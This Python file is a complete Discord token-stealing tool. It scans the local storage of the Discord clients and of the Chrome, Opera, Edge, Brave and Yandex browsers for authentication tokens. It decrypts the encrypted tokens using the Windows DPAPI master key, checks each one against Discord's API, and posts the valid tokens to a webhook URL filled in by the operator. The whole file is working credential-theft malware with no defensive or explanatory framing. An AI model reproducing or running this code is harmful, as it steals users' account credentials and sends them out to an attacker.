import base64
import json
import os
import re
import requests
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from typing import List, Optional

class TokenExtractor:
    def __init__(self):
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens: List[str] = []
        
    def get_browser_paths(self):
        return {
            'Discord': f'{self.roaming}\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': f'{self.roaming}\\discordcanary\\Local Storage\\leveldb\\',
            'Discord PTB': f'{self.roaming}\\discordptb\\Local Storage\\leveldb\\',
            'Chrome': f'{self.appdata}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Opera': f'{self.roaming}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': f'{self.roaming}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Microsoft Edge': f'{self.appdata}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': f'{self.appdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': f'{self.appdata}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\'
        }

    def decrypt_token(self, buff: bytes, master_key: bytes) -> Optional[str]:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception:
            return None

    def get_master_key(self, path: str) -> Optional[bytes]:
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = CryptUnprotectData(master_key[5:], None, None, None, 0)[1]
            return master_key
        except Exception:
            return None

    def validate_token(self, token: str) -> bool:
        try:
            response = requests.get(
                self.base_url, 
                headers={'Authorization': token},
                timeout=5
            )
            return response.status_code == 200
        except Exception:
            return False

    def extract(self) -> List[str]:
        for name, path in self.get_browser_paths().items():
            if not os.path.exists(path):
                continue

            discord_process = "cord" in path.lower()
            if discord_process:
                local_state_path = os.path.join(self.roaming, name.replace(" ", "").lower(), 'Local State')
                if not os.path.exists(local_state_path):
                    continue
                master_key = self.get_master_key(local_state_path)
                if not master_key:
                    continue

            for file_name in os.listdir(path):
                if not file_name.endswith(('.log', '.ldb')):
                    continue

                try:
                    with open(os.path.join(path, file_name), errors='ignore') as file:
                        for line in file.readlines():
                            line = line.strip()
                            if discord_process:
                                for match in re.findall(self.regexp_enc, line):
                                    token_enc = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
                                    token = self.decrypt_token(token_enc, master_key)
                                    if token and self.validate_token(token):
                                        self.tokens.append(token)
                            else:
                                for token in re.findall(self.regexp, line):
                                    if self.validate_token(token):
                                        self.tokens.append(token)
                except Exception:
                    continue

        return list(set(self.tokens))  

class DiscordWebhook:
    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url
        
    def send_tokens(self, tokens: List[str]) -> bool:
        if not tokens:
            return False
            
        embed = {
            "username": "Token Grabber",
            "embeds": [{
                "title": "Tokens Found!  🎯",
                "description": "\n".join(f"**```{token}```**" for token in tokens),
                "color": 0xb869a3
            }]
        }
        
        try:
            response = requests.post(
                self.webhook_url,
                json=embed,
                headers={"Content-Type": "application/json"},
                timeout=5
            )
            return response.status_code == 204
        except Exception:
            return False

def main(webhook_url: str):
    extractor = TokenExtractor()
    tokens = extractor.extract()
    
    if tokens:
        webhook = DiscordWebhook(webhook_url)
        webhook.send_tokens(tokens)

if __name__ == "__main__":
    WEBHOOK_URL = " WEBHOOK URL "
    main(WEBHOOK_URL)
